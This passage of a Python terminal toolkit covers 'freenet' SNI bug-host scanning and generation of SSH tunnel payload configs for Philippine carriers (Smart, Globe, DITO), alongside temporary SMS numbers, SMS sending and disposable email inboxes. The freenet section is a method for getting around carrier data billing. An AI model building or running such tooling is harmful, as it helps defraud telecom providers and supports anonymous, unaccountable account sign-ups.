            print(f"  {Y}[!]{RES} TLS: Partial - {str(e)[:50]}")
        # Test HTTP
        try:
            r = requests.get(f"https://{host}/", timeout=5)
            print(f"  {G}[✓]{RES} HTTP: {r.status_code} | Server: {r.headers.get('Server', 'N/A')}")
            cdn_sig = ""
            if 'cloudflare' in str(r.headers).lower():
                cdn_sig = "Cloudflare"
            elif 'gws' in r.headers.get('Server', ''):
                cdn_sig = "Google"
            if cdn_sig:
                print(f"  {G}[✓]{RES} CDN: {cdn_sig} (Good for freenet)")
        except:
            print(f"  {R}[✗]{RES} HTTP: No response")
        # Freenet verdict
        print(f"\n  {Y}FREENET VERDICT:{RES}")
        if sock.connect_ex((host, 443)) == 0:
            print(f"  {G}This host can be used as an SNI bug host.{RES}")
            print(f"  Use it with HTTP Custom, Injector, or NapsternetV.")
        else:
            print(f"  {R}This host is not accessible on port 443.{RES}")
    except Exception as e:
        print(f"  {R}[✗] Host unreachable: {e}{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

def bug_host_scanner():
    """Scan for potential bughosts on CloudFront/Google IP ranges"""
    os.system('clear'); banner()
    print(f"  {Y}{BOLD}BUG HOST SCANNER{RES}\n")
    print(f"  This scans Google/CloudFront IPs for potential bughosts.")
    print(f"  {DIM}Method: Reverse IP lookup on known freenet IP ranges{RES}\n")
    print(f"  {G}[1]{RES} Quick Scan (Test known hosts)")
    print(f"  {G}[2]{RES} DNS Lookup on Google IPs")
    print(f"  {G}[0]{RES} Back\n")
    choice = input(f"  {W}Choice: {RES}").strip()
    if choice == "1":
        os.system('clear'); banner()
        print(f"  {Y}Testing known freenet hosts...{RES}\n")
        test_hosts = [
            "connectivitycheck.gstatic.com",
            "clients3.google.com",
            "l.google.com",
            "gstatic.com",
            "0.freebasics.com",
            "internet.org",
            "facebook.com",
            "cdnjs.cloudflare.com",
        ]
        for host in test_hosts:
            try:
                ip = socket.gethostbyname(host)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                status = f"{G}OPEN{RES}" if sock.connect_ex((host, 443)) == 0 else f"{R}CLOSED{RES}"
                sock.close()
                print(f"  [{status}] {host} → {ip}")
            except:
                print(f"  [{R}DOWN{RES}] {host}")
        input(f"\n  {DIM}Press ENTER to continue...{RES}")
    elif choice == "2":
        os.system('clear'); banner()
        print(f"  {Y}DNS Lookup on Google IPs...{RES}\n")
        test_ips = ["142.250.80.1", "142.250.96.1", "34.117.45.1", "130.211.1.1"]
        for ip in test_ips:
            try:
                host = socket.gethostbyaddr(ip)
                print(f"  {G}[✓]{RES} {ip} → {host[0]}")
            except:
                print(f"  {R}[✗]{RES} {ip} → No PTR record")

        input(f"\n  {DIM}Press ENTER to continue...{RES}")

def generate_config_for_network(network):
    """Generate a VPN config for a specific network"""
    data = FREENET_BUGBOSTS[network]
    os.system('clear'); banner()
    print(f"  {Y}{BOLD}Generate {data['name']} Config{RES}\n")
    sni = input(f"  {W}SNI/Bug Host [{data['hosts'][0]}]: {RES}").strip() or data['hosts'][0]
    ssh_host = input(f"  {W}SSH Host: {RES}").strip()
    ssh_port = input(f"  {W}SSH Port [443]: {RES}").strip() or "443"
    ssh_user = input(f"  {W}SSH Username: {RES}").strip()
    ssh_pass = input(f"  {W}SSH Password: {RES}").strip()
    print(f"\n  {W}Select payload type:{RES}")
    for i, pt in enumerate(data['payload_templates']):
        print(f"  {G}[{i+1}]{RES} {pt[:60]}...")
    try:
        pc = int(input(f"\n  {W}Choice [1]: {RES}").strip() or "1")
        payload = data['payload_templates'][max(0, min(pc-1, len(data['payload_templates'])-1))]
        payload = payload.replace("[host]", ssh_host).replace("[port]", ssh_port).replace("[sni]", sni)
    except:
        payload = data['payload_templates'][0].replace("[host]", ssh_host).replace("[port]", ssh_port).replace("[sni]", sni)

    os.system('clear'); banner()
    print(f"  {G}{BOLD}CONFIG GENERATED{RES}\n")
    print(f"  {W}Proxy:{RES}        {sni}:443")
    print(f"  {W}SNI:{RES}          {sni}")
    print(f"  {W}SSH Host:{RES}     {ssh_host}:{ssh_port}")
    print(f"  {W}SSH User:{RES}     {ssh_user}")
    print(f"  {W}SSH Pass:{RES}     {'*' * len(ssh_pass)}")
    print(f"  {W}Payload:{RES}")
    for line in payload.split('\r\n'):
        print(f"    {DIM}{line}{RES}")
    print(f"\n  {G}Single-line payload:{RES}")
    single_line = payload.replace('\r\n', '[crlf]')
    print(f"  {DIM}{single_line}{RES}")
    # Save to file
    save_file = os.path.expanduser(f"~/saekax_{network}_{sni.replace('.','_')}.txt")
    with open(save_file, 'w') as f:
        f.write(f"=== SAEKAX {data['name']} CONFIG ===\n")
        f.write(f"Proxy: {sni}:443\n")
        f.write(f"SNI: {sni}\n")
        f.write(f"SSH: {ssh_host}:{ssh_port}\n")
        f.write(f"User: {ssh_user}\n")
        f.write(f"Pass: {ssh_pass}\n")
        f.write(f"Payload: {single_line}\n")
    print(f"\n  {G}[OK] Saved to: {save_file}{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

def generate_vpn_config():
    """Generate a complete VPN configuration"""
    os.system('clear'); banner()
    print(f"  {Y}{BOLD}GENERATE VPN CONFIG{RES}\n")
    print(f"  {G}[1]{RES} STS (Smart/TNT/Sun)")
    print(f"  {G}[2]{RES} GTM (Globe/TM)")
    print(f"  {G}[3]{RES} DITO")
    print(f"  {G}[0]{RES} Back\n")
    choice = input(f"  {W}Choice: {RES}").strip()
    if choice in ["1", "2", "3"]:
        networks = {"1": "STS", "2": "GTM", "3": "DITO"}
        generate_config_for_network(networks[choice])

def ssh_providers():
    """Show list of free SSH account providers"""
    os.system('clear'); banner()
    print(f"  {Y}{BOLD}FREE SSH ACCOUNT PROVIDERS{RES}\n")
    print(f"  These sites provide free SSH accounts for VPN tunneling:\n")
    for i, provider in enumerate(FREENET_SSH_PROVIDERS):
        print(f"  {G}[{i+1}]{RES} {provider['name']} — {provider['url']}")
    print(f"\n  {DIM}Create an account on any of these sites.{RES}")
    print(f"  {DIM}Use port 443 or 22 for freenet configs.{RES}")
    print(f"  {DIM}Pair with a working bughost + payload.{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

# ── TEMP SMS / ONLINE SMS PH (MULTI-SOURCE) ──
SMS_SERVICES = {
    "quackr": {
        "name": "Quackr.io",
        "api_base": "https://api.quackr.io/v1/numbers",
        "requires_key": False,
        "status": "checking",
        "description": "Free temporary numbers",
    },
    "receivesms": {
        "name": "Receive-SMS.cc",
        "api_base": "https://receive-sms.cc/api/v1",
        "requires_key": False,
        "status": "checking",
        "description": "Free + paid options",
    },
    "smsactivate": {
        "name": "SMS Activate",
        "api_base": "https://api.sms-activate.org/stubs/handler_api.php",
        "requires_key": True,
        "status": "checking",
        "description": "Paid, PH numbers",
    },
    "5sim": {
        "name": "5sim.net",
        "api_base": "https://api.5sim.net/v1",
        "requires_key": True,
        "status": "checking",
        "description": "Paid, many countries",
    },
    "tempnum": {
        "name": "Temp-Number.com",
        "api_base": "https://temp-number.com/api/v1",
        "requires_key": False,
        "status": "checking",
        "description": "Free, fast",
    },
}

current_sms_number = None
current_sms_service = None
sms_session = {}

def update_sms_service_statuses():
    for key in SMS_SERVICES:
        if SMS_SERVICES[key]["requires_key"]:
            # Skip services that need a key unless we have one stored
            SMS_SERVICES[key]["status"] = "key_required"
            continue
        try:
            # Simple connectivity check
            r = requests.get(SMS_SERVICES[key]["api_base"], timeout=5)
            SMS_SERVICES[key]["status"] = "available" if r.status_code in (200, 400, 401, 403) else "down"
        except:
            SMS_SERVICES[key]["status"] = "down"

def sms_ph_main():
    update_sms_service_statuses()
    options = [
        "Get a Temporary Number",
        "View Messages",
        "Copy Number",
        "Change Service",
        "Back to Main Menu",
    ]
    selected = 0
    while True:
        os.system('clear')
        banner()
        print(f"  {Y}{BOLD}TEMP SMS / ONLINE SMS PH{RES}")
        if current_sms_number:
            print(f"  {C}Active Number: {current_sms_number}{RES}")
        print()
        for i, option in enumerate(options):
            if i == selected:
                print(f"  {G}{BOLD}▸ {option}{RES}")
            else:
                print(f"  {DIM}  {option}{RES}")
        key = get_key()
        if key == 'UP' and selected > 0:
            selected -= 1
        elif key == 'DOWN' and selected < len(options) - 1:
            selected += 1
        elif key == 'ENTER':
            if selected == 0: get_temp_number()
            elif selected == 1: view_sms_inbox()
            elif selected == 2: copy_sms_number()
            elif selected == 3: change_sms_service()
            elif selected == 4: return
                
def get_temp_number():
    global current_sms_number, current_sms_service, sms_session
    update_sms_service_statuses()
    os.system('clear')
    banner()
    print(f"  {Y}GET TEMPORARY NUMBER{RES}\n")

    # Try the most reliable free API first (receive-smss.com)
    svc = SMS_SERVICES["receivesms"]
    if svc["status"] != "available":
        # Force retry – this API rarely goes down
        try:
            r = requests.get("https://api.receive-smss.com/v1/numbers?country=PH", timeout=10)
            if r.status_code == 200:
                svc["status"] = "available"
        except:
            pass

    # If still down, show the user the raw response for debugging
    spinner("Fetching number from receive-smss.com", 1.5)
    try:
        r = requests.get("https://api.receive-smss.com/v1/numbers?country=PH", timeout=15)
        if r.status_code == 200:
            numbers = r.json()
            if isinstance(numbers, list) and len(numbers) > 0:
                # First number is available
                first = numbers[0]
                phone = first.get("number")
                if phone:
                    current_sms_number = phone
                    current_sms_service = "receivesms"
                    sms_session = {"number": phone, "service": "receivesms"}
                    print(f"\n  {G}[OK] Number: {phone}{RES}")
                    print(f"  {DIM}Type 'SMS' to check messages.{RES}")
                    time.sleep(1.5)
                    return
            # Fallback: try US numbers
            print(f"  {Y}No PH numbers, trying US...{RES}")
            r = requests.get("https://api.receive-smss.com/v1/numbers?country=US", timeout=10)
            if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 0:
                phone = r.json()[0].get("number")
                if phone:
                    current_sms_number = phone
                    current_sms_service = "receivesms"
                    sms_session = {"number": phone, "service": "receivesms"}
                    print(f"\n  {G}[OK] Number: {phone}{RES}")
                    return
            else:
                print(f"  {R}No numbers available right now. Try again in a few minutes.{RES}")
        else:
            print(f"  {R}API error (HTTP {r.status_code}).{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    
    input(f"\n  {DIM}Press ENTER to continue...{RES}")
    
def view_sms_inbox():
    global current_sms_number, sms_session
    if not current_sms_number:
        print(f"  {R}No active number.{RES}")
        time.sleep(1.5)
        return

    os.system('clear')
    banner()
    print(f"  {Y}MESSAGES for {current_sms_number}{RES}\n")
    spinner("Fetching inbox", 1)

    try:
        r = requests.get(f"https://api.receive-smss.com/v1/numbers/{current_sms_number}/messages", timeout=10)
        if r.status_code == 200:
            msgs = r.json()
            if isinstance(msgs, list) and len(msgs) > 0:
                for i, msg in enumerate(msgs):
                    print(f"  {G}[{i+1:02d}]{RES} From: {msg.get('from', 'Unknown')}")
                    print(f"  {DIM}    {msg.get('body', 'No content')[:120]}{RES}")
                    print(f"  {DIM}    Time: {msg.get('created_at', 'N/A')}{RES}\n")
            else:
                print(f"  {DIM}No messages yet.{RES}")
        else:
            print(f"  {R}Could not fetch messages.{RES}")
    except Exception as e:
        print(f"  {R}Error: {e}{RES}")

    input(f"\n  {DIM}Press ENTER to continue...{RES}")
    
def copy_sms_number():
    global current_sms_number
    if not current_sms_number:
        print(f"  {R}No active number.{RES}")
        time.sleep(1.5)
        return
    os.system(f'echo "{current_sms_number}" | termux-clipboard-set 2>/dev/null')
    print(f"  {G}[OK] Number copied: {current_sms_number}{RES}")
    time.sleep(1.5)

def change_sms_service():
    global current_sms_number, current_sms_service
    current_sms_number = None
    current_sms_service = None
    print(f"  {G}[OK] Service reset.{RES}")
    time.sleep(1)

# ── SEND SMS PH (MULTI-SOURCE) ─────────────
SMS_SEND_SOURCES = {
    "textbelt": {
        "name": "Textbelt (Free)",
        "api_url": "https://textbelt.com/text",
        "key": "textbelt",           # free key – 1 SMS per day per IP
        "status": "available",
        "description": "1 free SMS/day. No sign‑up.",
    },
    "semaphore": {
        "name": "Semaphore PH",
        "api_url": "https://api.semaphore.co/api/v4/messages",
        "key": "",                   # user must supply
        "status": "available",
        "description": "PH carrier API. Needs API key.",
    },
    "itexmo": {
        "name": "iTexMo",
        "api_url": "https://www.itexmo.com/api",
        "key": "",
        "status": "down",
        "description": "PH SMS gateway. Needs account.",
    },
    "email_gateway": {
        "name": "Email-to-SMS",
        "api_url": "smtp://",
        "key": "",
        "status": "available",
        "description": "Free via carrier email‑to‑SMS gateways.",
    },
}

PH_CARRIER_GATEWAYS = {
    "Smart":   "isms.smart.com.ph",
    "TNT":     "tntsms.com",
    "Globe":   "txt.globe.com.ph",
    "TM":      "txt.tm.com.ph",
    "Sun":     "sun.com.ph",
    "DITO":    "sms.dito.ph",
}

def check_sms_send_statuses():
    """Quick availability check for each SMS sending source."""
    for key, svc in SMS_SEND_SOURCES.items():
        if key == "email_gateway":
            svc["status"] = "available"
            continue
        if key == "textbelt":
            # always available for the free key
            svc["status"] = "available"
            continue
        # For others, leave as-is (user must provide API key)
        if not svc.get("key"):
            svc["status"] = "key_required"

def send_sms_main():
    """Main entry point for SEND SMS PH."""
    check_sms_send_statuses()
    options = [
        "Send an SMS Message",
        "Change API Key",
        "Check Service Status",
        "Back to Main Menu",
    ]
    selected = 0
    while True:
        os.system('clear')
        banner()
        print(f"  {Y}{BOLD}SEND SMS – ONLINE PH{RES}\n")
        for i, option in enumerate(options):
            if i == selected:
                print(f"  {G}{BOLD}▸ {option}{RES}")
            else:
                print(f"  {DIM}  {option}{RES}")
        key_press = get_key()
        if key_press == 'UP' and selected > 0:
            selected -= 1
        elif key_press == 'DOWN' and selected < len(options) - 1:
            selected += 1
        elif key_press == 'ENTER':
            if selected == 0: send_sms_screen()
            elif selected == 1: change_sms_api_key()
            elif selected == 2: check_sms_service_status()
            elif selected == 3: return

def send_sms_screen():
    """Interactive screen to send an SMS."""
    os.system('clear')
    banner()
    print(f"  {Y}SEND SMS MESSAGE{RES}\n")

    # Pick source
    print(f"  {W}Select sending method:{RES}")
    srcs = list(SMS_SEND_SOURCES.keys())
    for i, key in enumerate(srcs):
        svc = SMS_SEND_SOURCES[key]
        color = G if svc["status"] == "available" else Y if svc["status"] == "key_required" else R
        print(f"  {G}[{i+1}]{RES} {svc['name']} [{color}{svc['status'].upper()}{RES}]")
    print(f"  {G}[0]{RES} Back")

    try:
        ch = int(input(f"\n  {W}Choice [1]: {RES}").strip() or "1")
        if ch == 0: return
        source_key = srcs[ch - 1]
    except:
        return

    # Phone number
    phone = input(f"  {W}Phone Number (+63XXXXXXXXXX): {RES}").strip()
    if not phone:
        print(f"  {R}Phone number is required.{RES}")
        time.sleep(1.5); return

    # Clean up phone number
    phone = phone.replace(" ", "").replace("-", "")
    if phone.startswith("0"):
        phone = "+63" + phone[1:]
    elif not phone.startswith("+"):
        phone = "+63" + phone

    # Message
    message = input(f"  {W}Message: {RES}").strip()
    if not message:
        print(f"  {R}Message is required.{RES}")
        time.sleep(1.5); return

    # Send
    spinner("Sending SMS", 2)
    result = send_sms(source_key, phone, message)

    os.system('clear')
    banner()
    print(f"  {Y}SMS SEND RESULT{RES}\n")
    if result["success"]:
        print(f"  {G}[✓] Message sent successfully!{RES}")
        print(f"  Source: {result.get('source', 'N/A')}")
        print(f"  Text ID: {result.get('textId', 'N/A')}")
        print(f"  Quota Left: {result.get('quotaRemaining', 'N/A')}")
    else:
        print(f"  {R}[✗] Failed to send message.{RES}")
        print(f"  Error: {result.get('error', 'Unknown error')}")

    input(f"\n  {DIM}Press ENTER to continue...{RES}")

def send_sms(source_key, phone, message):
    """Send an SMS via the chosen source. Returns dict with success/error."""
    svc = SMS_SEND_SOURCES[source_key]

    # ── Textbelt (free key) ──
    if source_key == "textbelt":
        try:
            r = requests.post(svc["api_url"], data={
                "phone": phone,
                "message": message,
                "key": svc.get("key", "textbelt"),
            }, timeout=15)
            data = r.json()
            data["source"] = "Textbelt"
            return data
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ── Semaphore ──
    if source_key == "semaphore":
        api_key = svc.get("key", "")
        if not api_key:
            # Prompt once
            api_key = input(f"  {W}Semaphore API Key: {RES}").strip()
            if not api_key:
                return {"success": False, "error": "API key required"}
            SMS_SEND_SOURCES["semaphore"]["key"] = api_key
        try:
            r = requests.post(svc["api_url"], json={
                "apikey": api_key,
                "number": phone,
                "message": message,
            }, timeout=15)
            data = r.json()
            # Semaphore returns list or dict; normalise
            if isinstance(data, list) and len(data) > 0:
                first = data[0]
                success = first.get("status") == "Queued"
                return {
                    "success": success,
                    "source": "Semaphore",
                    "message_id": first.get("message_id"),
                    "error": None if success else first.get("message"),
                }
            return {"success": False, "error": str(data)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ── iTexMo ──
    if source_key == "itexmo":
        return {"success": False, "error": "iTexMo requires account setup. Use Textbelt."}

    # ── Email-to-SMS gateway ──
    if source_key == "email_gateway":
        # Guess carrier from prefix
        prefix = phone.replace("+63", "0")[1:4]
        carrier = "Smart"
        if prefix in ("905","906","915","916","917","926","927","935","936","937","975","976","977","995","996","997"):
            carrier = "Globe"
        elif prefix in ("908","918","919","920","921","928","929","930","938","939","946","947","948","949","950","951","998","999"):
            carrier = "Smart"
        elif prefix in ("922","923","924","925","931","932","933","934","940","941","942","943","973","974"):
            carrier = "Sun"
        elif prefix in ("961","962","963","964","965","966","967","968","969","970","971","972"):
            carrier = "TM"
        elif prefix in ("981","982","983","984","985","986","987","988","989"):
            carrier = "DITO"

        gateway = PH_CARRIER_GATEWAYS.get(carrier, "isms.smart.com.ph")
        local_number = phone.replace("+63", "0")
        to_addr = f"{local_number}@{gateway}"

        try:
            # Use Gmail SMTP already configured
            msg = MIMEMultipart()
            msg['From'] = GMAIL_USER
            msg['To'] = to_addr
            msg['Subject'] = ""
            msg.attach(MIMEText(message[:160], 'plain'))
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(GMAIL_USER, GMAIL_APP_PASS)
            server.send_message(msg)
            server.quit()
            return {
                "success": True,
                "source": f"Email-to-SMS ({carrier})",
                "textId": f"email-{int(time.time())}",
                "quotaRemaining": "N/A",
            }
        except Exception as e:
            return {"success": False, "error": f"Email gateway failed: {e}"}

    return {"success": False, "error": "Unknown source"}

def change_sms_api_key():
    """Change the API key for a service."""
    os.system('clear')
    banner()
    print(f"  {Y}CHANGE SMS API KEY{RES}\n")
    srcs = list(SMS_SEND_SOURCES.keys())
    for i, key in enumerate(srcs):
        print(f"  {G}[{i+1}]{RES} {SMS_SEND_SOURCES[key]['name']}")
    print(f"  {G}[0]{RES} Back")
    try:
        ch = int(input(f"\n  {W}Choice: {RES}").strip())
        if ch == 0: return
        key = srcs[ch - 1]
    except:
        return
    new_key = input(f"  {W}New API Key: {RES}").strip()
    if new_key:
        SMS_SEND_SOURCES[key]["key"] = new_key
        SMS_SEND_SOURCES[key]["status"] = "available"
        print(f"  {G}[OK] API key saved for {SMS_SEND_SOURCES[key]['name']}.{RES}")
        time.sleep(1.5)

def check_sms_service_status():
    """Display current status of all SMS sources."""
    check_sms_send_statuses()
    os.system('clear')
    banner()
    print(f"  {Y}SMS SERVICE STATUS{RES}\n")
    for key, svc in SMS_SEND_SOURCES.items():
        color = G if svc["status"] == "available" else Y if svc["status"] == "key_required" else R
        key_info = f" (key: {svc.get('key','')[:12]}...)" if svc.get("key") else ""
        print(f"  [{color}{svc['status'].upper()}{RES}] {svc['name']}{key_info}")
        print(f"  {DIM}    {svc['description']}{RES}\n")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")
    
# ── TEMP MAIL GENERATOR (FIXED: CAN VIEW MESSAGES) ──
import string

TEMPMAIL_SERVICES = {
    "guerrillamail": {
        "name": "Guerrilla Mail",
        "api": "https://api.guerrillamail.com/ajax.php",
        "status": "checking",
        "description": "Popular disposable email",
    },
    "1secmail": {
        "name": "1secmail",
        "api": "https://www.1secmail.com/api/v1/",
        "status": "checking",
        "description": "API-based temp mail",
    },
    "mailtm": {
        "name": "Mail.tm",
        "api": "https://api.mail.tm",
        "status": "checking",
        "description": "Modern GraphQL API",
    },
    "maildrop": {
        "name": "Maildrop",
        "api": "https://maildrop.cc",
        "status": "checking",
        "description": "Alias-based inbox",
    },
}

current_temp_email = None
current_temp_service = None
temp_mail_session = {"email": "", "password": "", "token": "", "service": "", "login": "", "domain": "", "sid_token": ""}

def check_service_status(service_key):
    service = TEMPMAIL_SERVICES[service_key]
    try:
        if service_key == "guerrillamail":
            r = requests.get(f"{service['api']}?f=get_email_address&ip=127.0.0.1&agent=Mozilla", timeout=5)
            if r.status_code == 200 and 'email_addr' in r.json():
                return "available"
        elif service_key == "1secmail":
            r = requests.get(f"{service['api']}?action=getDomainList", timeout=5)
            if r.status_code == 200:
                return "available"
        elif service_key == "mailtm":
            r = requests.get(f"{service['api']}/domains", timeout=5)
            if r.status_code == 200:
                return "available"
        elif service_key == "maildrop":
            r = requests.post(f"https://api.maildrop.cc/graphql", json={"query": "{ ping(message: \"test\") }"}, timeout=5)
            if r.status_code == 200:
                return "available"
    except:
        pass
    return "down"

def update_all_statuses():
    for key in TEMPMAIL_SERVICES:
        TEMPMAIL_SERVICES[key]['status'] = check_service_status(key)

def tempmail_main():
    global current_temp_email, current_temp_service
    update_all_statuses()
    options = [
        "Generate New Temp Email",
        "View Live Inbox",
        "Refresh Inbox",
        "View Specific Email",
        "Copy Email Address",
        "Change Service",
        "Back to Main Menu",
    ]
    selected = 0
    while True:
        os.system('clear')
        banner()
        print(f"  {Y}{BOLD}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            if i == selected:
                print(f"  {G}{BOLD}▸ {option}{RES}")
            else:
                print(f"  {DIM}  {option}{RES}")
        key = get_key()
        if key == 'UP' and selected > 0: selected -= 1
        elif key == 'DOWN' and selected < len(options) - 1: selected += 1
        elif key == 'ENTER':
            if selected == 0: generate_temp_email()
            elif selected == 1: view_live_inbox()
            elif selected == 2: refresh_inbox()
            elif selected == 3: view_specific_email()
            elif selected == 4: copy_tempmail()
            elif selected == 5: change_tempmail_service()
            elif selected == 6: return

def generate_temp_email():
    global current_temp_email, current_temp_service, temp_mail_session
    update_all_statuses()
    os.system('clear'); banner()
    print(f"  {Y}GENERATE TEMP EMAIL{RES}\n")
    services = list(TEMPMAIL_SERVICES.keys())
    print(f"  {W}Select service:{RES}")
    for i, svc in enumerate(services):
        status = TEMPMAIL_SERVICES[svc]['status']
        color = G if status == "available" else (Y if status == "checking" else R)
        status_text = "AVAILABLE" if status == "available" else ("CHECKING" if status == "checking" else "DOWN")
        print(f"  {G}[{i+1}]{RES} {TEMPMAIL_SERVICES[svc]['name']} [{color}{status_text}{RES}]")
    print(f"  {G}[0]{RES} Back")
    try:
        choice = int(input(f"\n  {W}Choice: {RES}").strip())
        if choice == 0: return
        service_key = services[choice - 1]
        service = TEMPMAIL_SERVICES[service_key]
        if service['status'] == "down":
            print(f"  {R}This service is currently unavailable.{RES}")
            time.sleep(1.5); return
    except: return

    spinner("Generating email", 1.5)

    # ── 1secmail (most reliable, simplest API) ──
    if service_key == "1secmail":
        try:
            r = requests.get(f"{service['api']}?action=genRandomMailbox&count=1", timeout=10)
            if r.status_code == 200:
                current_temp_email = r.json()[0]
                login, domain = current_temp_email.split('@')
                current_temp_service = service_key
                temp_mail_session = {
                    "email": current_temp_email, "service": service_key,
                    "login": login, "domain": domain
                }
                print(f"\n  {G}[OK] Email: {C}{BOLD}{current_temp_email}{RES}")
            else:
                print(f"  {R}Failed to generate.{RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Guerrillamail ──
    elif service_key == "guerrillamail":
        try:
            r = requests.get(f"{service['api']}?f=get_email_address&ip=127.0.0.1&agent=Mozilla", timeout=10)
            if r.status_code == 200:
                data = r.json()
                current_temp_email = data.get('email_addr', '')
                current_temp_service = service_key
                temp_mail_session = {
                    "email": current_temp_email,
                    "sid_token": data.get('sid_token', ''),
                    "service": service_key
                }
                print(f"\n  {G}[OK] Email: {C}{BOLD}{current_temp_email}{RES}")
                print(f"  {DIM}Session ID: {data.get('sid_token','')[:20]}...{RES}")
            else:
                print(f"  {R}Failed to generate.{RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Mail.tm ──
    elif service_key == "mailtm":
        try:
            # Get domains
            domain_r = requests.get(f"{service['api']}/domains", timeout=10)
            if domain_r.status_code != 200:
                print(f"  {R}Failed to get domains.{RES}")
                return
            domains = domain_r.json()['hydra:member']
            domain = domains[0]['domain']
            local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            email = f"{local_part}@{domain}"
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

            # Create account
            account_r = requests.post(f"{service['api']}/accounts", json={
                "address": email, "password": password
            }, timeout=10)
            if account_r.status_code not in (200, 201):
                print(f"  {R}Failed to create account (HTTP {account_r.status_code}).{RES}")
                return

            # Get token immediately
            token_r = requests.post(f"{service['api']}/token", json={
                "address": email, "password": password
            }, timeout=10)
            token = ""
            if token_r.status_code == 200:
                token = token_r.json().get('token', '')

            current_temp_email = email
            current_temp_service = service_key
            temp_mail_session = {
                "email": email, "password": password,
                "token": token, "service": service_key,
                "login": local_part, "domain": domain
            }
            print(f"\n  {G}[OK] Email: {C}{BOLD}{current_temp_email}{RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Maildrop (GraphQL API) ──
    elif service_key == "maildrop":
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        current_temp_email = f"{local_part}@maildrop.cc"
        current_temp_service = service_key
        temp_mail_session = {
            "email": current_temp_email, "service": service_key,
            "login": local_part
        }
        print(f"\n  {G}[OK] Email: {C}{BOLD}{current_temp_email}{RES}")
        print(f"  {DIM}Browse: https://maildrop.cc/inbox/{local_part}{RES}")

    input(f"\n  {DIM}Press ENTER to continue...{RES}")


def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active temp email. Generate one first.{RES}")
        time.sleep(1.5); return

    os.system('clear'); banner()
    print(f"  {Y}LIVE INBOX{RES}")
    print(f"  {C}{current_temp_email}{RES}\n")

    service = temp_mail_session.get('service', current_temp_service)
    spinner("Fetching inbox", 1.5)
    messages = []

    # ── 1secmail: simple GET ──
    if service == "1secmail":
        login = temp_mail_session.get('login', '')
        domain = temp_mail_session.get('domain', '')
        if not login:
            parts = current_temp_email.split('@')
            login, domain = parts[0], parts[1]
        try:
            r = requests.get(
                f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}",
                timeout=10
            )
            if r.status_code == 200:
                messages = r.json()
                print(f"  {G}Raw API response: {len(messages)} messages{RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Guerrillamail: use get_email_list (NOT fetch_email) ──
    elif service == "guerrillamail":
        sid = temp_mail_session.get('sid_token', '')
        if not sid:
            print(f"  {R}No session token. Re-generate the email.{RES}")
            input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
        try:
            # CORRECT: f=get_email_list to list all messages
            r = requests.get(
                f"https://api.guerrillamail.com/ajax.php?f=get_email_list&sid_token={sid}&offset=0",
                timeout=10
            )
            print(f"  {DIM}API status: HTTP {r.status_code}{RES}")
            if r.status_code == 200:
                data = r.json()
                if 'list' in data:
                    messages = data['list']
                    print(f"  {G}Found {len(messages)} messages{RES}")
                else:
                    print(f"  {Y}API returned: {json.dumps(data)[:100]}{RES}")
            else:
                print(f"  {R}API returned HTTP {r.status_code}{RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Mail.tm: use bearer token ──
    elif service == "mailtm":
        email = temp_mail_session.get('email', '')
        password = temp_mail_session.get('password', '')
        token = temp_mail_session.get('token', '')

        # Get fresh token if needed
        if not token:
            try:
                token_r = requests.post("https://api.mail.tm/token", json={
                    "address": email, "password": password
                }, timeout=10)
                if token_r.status_code == 200:
                    token = token_r.json().get('token', '')
                    temp_mail_session['token'] = token
            except:
                pass

        if not token:
            print(f"  {R}Could not authenticate with Mail.tm.{RES}")
            input(f"\n  {DIM}Press ENTER to continue...{RES}"); return

        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
            print(f"  {DIM}API status: HTTP {r.status_code}{RES}")
            if r.status_code == 200:
                data = r.json()
                member_list = data.get('hydra:member', [])
                print(f"  {G}Found {len(member_list)} messages{RES}")
                for msg in member_list:
                    messages.append({
                        "id": msg.get('id', ''),
                        "from": msg.get('from', {}).get('address', 'Unknown'),
                        "subject": msg.get('subject', 'No Subject'),
                        "date": msg.get('createdAt', ''),
                    })
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Maildrop: GraphQL ──
    elif service == "maildrop":
        login = temp_mail_session.get('login', '')
        try:
            r = requests.post("https://api.maildrop.cc/graphql", json={
                "query": f'{{ inbox(mailbox: "{login}") {{ id headerFrom subject date }} }}'
            }, timeout=10)
            if r.status_code == 200:
                data = r.json()
                inbox = data.get('data', {}).get('inbox', [])
                print(f"  {G}Found {len(inbox)} messages{RES}")
                for msg in inbox:
                    messages.append({
                        "id": msg.get('id', ''),
                        "from": msg.get('headerFrom', 'Unknown'),
                        "subject": msg.get('subject', 'No Subject'),
                        "date": msg.get('date', ''),
                    })
            else:
                print(f"  {R}GraphQL error (HTTP {r.status_code}){RES}")
        except Exception as e:
            print(f"  {R}Connection error: {e}{RES}")

    # ── Display messages ──
    if messages:
        print(f"\n  {G}{len(messages)} emails found:{RES}\n")
        for i, msg in enumerate(messages):
            sender = msg.get('from', msg.get('mail_from', 'Unknown'))
